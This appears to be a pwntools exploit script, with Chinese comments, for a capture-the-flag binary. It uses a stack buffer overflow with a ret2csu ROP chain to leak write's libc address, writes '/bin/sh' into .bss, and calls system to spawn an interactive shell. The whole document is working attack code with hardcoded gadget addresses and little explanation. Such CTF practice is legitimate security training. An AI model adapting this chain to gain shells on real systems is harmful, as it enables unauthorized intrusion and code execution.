from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#p = remote('geek.ctfplus.cn',30439)
p = process('./pwn')
elf = ELF('./pwn')
libc = ELF('./libc.so.6')
offset = 136
csu_gadget_1 = 0x4012b0  
csu_gadget_2 = 0x4012ca  
pop_rdi_ret = 0x4012d3  
ret_gadget = 0x4010a0   
# sub函数地址
vuln_func_addr = 0x401156
write_got = elf.got['write']
read_got = elf.got['read']
bss_addr = 0x404040

# 1.泄露 write 函数的真实地址
payload1 = b'A' * offset
payload1 += p64(csu_gadget_2) 
payload1 += p64(0)             
payload1 += p64(2)             
payload1 += p64(1)            
payload1 += p64(write_got)    
payload1 += p64(8)            
payload1 += p64(write_got)     
payload1 += p64(csu_gadget_1) 
payload1 += p64(0) * 7         
payload1 += p64(vuln_func_addr) 
p.sendafter(b"care about it !\x00\n", payload1)
leaked_write = u64(p.recv(8))
libc.address = leaked_write - libc.symbols['write']
system_addr = libc.symbols['system']

# 2. 写入 '/bin/sh' 到 .bss 段
payload2 = b'A' * offset
payload2 += p64(csu_gadget_2)
payload2 += p64(0)             
payload2 += p64(2)             
payload2 += p64(0)            
payload2 += p64(bss_addr)     
payload2 += p64(8)             
payload2 += p64(read_got)     
payload2 += p64(csu_gadget_1)  
payload2 += p64(0) * 7        
payload2 += p64(vuln_func_addr) 
p.send(payload2)
p.send(b'/bin/sh\x00')

# 3. 调用 system('/bin/sh')
payload3 = b'A' * offset
payload3 += p64(ret_gadget)    
payload3 += p64(pop_rdi_ret) 
payload3 += p64(bss_addr)    
payload3 += p64(system_addr)  
p.send(payload3)
p.interactive()
